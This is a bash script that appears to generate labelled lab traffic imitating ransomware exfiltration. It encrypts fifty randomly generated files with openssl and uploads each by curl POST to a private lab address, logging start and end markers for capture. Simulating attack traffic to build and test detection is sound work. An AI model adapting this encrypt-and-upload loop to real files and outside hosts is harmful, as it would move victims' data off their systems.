#!/bin/bash
SRC_IP=$(hostname -i | awk '{print $1}')
TARGET_IP="192.168.50.99"
START=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$START,EXFIL_RANSOMWARE_START,$SRC_IP,$TARGET_IP"

# Run 5 rounds of 10 files each, with 5s pauses between rounds.
# Total duration ~50s, ensuring traffic spans >= 1 capture segment.
SCRATCH=$(mktemp -d)
for round in 1 2 3 4 5; do
    for i in $(seq 1 10); do
        dd if=/dev/urandom of="$SCRATCH/file${round}_${i}.bin" bs=1M count=1 2>/dev/null
        openssl enc -aes-256-cbc -salt \
            -in "$SCRATCH/file${round}_${i}.bin" \
            -out "$SCRATCH/file${round}_${i}.enc" \
            -pass pass:labkey 2>/dev/null
        curl -s -X POST --data-binary @"$SCRATCH/file${round}_${i}.enc" \
            "http://${TARGET_IP}:8080/upload" -o /dev/null 2>/dev/null || true
    done
    sleep 5
done
rm -rf "$SCRATCH"

END=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
echo "$END,EXFIL_RANSOMWARE_END,$SRC_IP,$TARGET_IP"
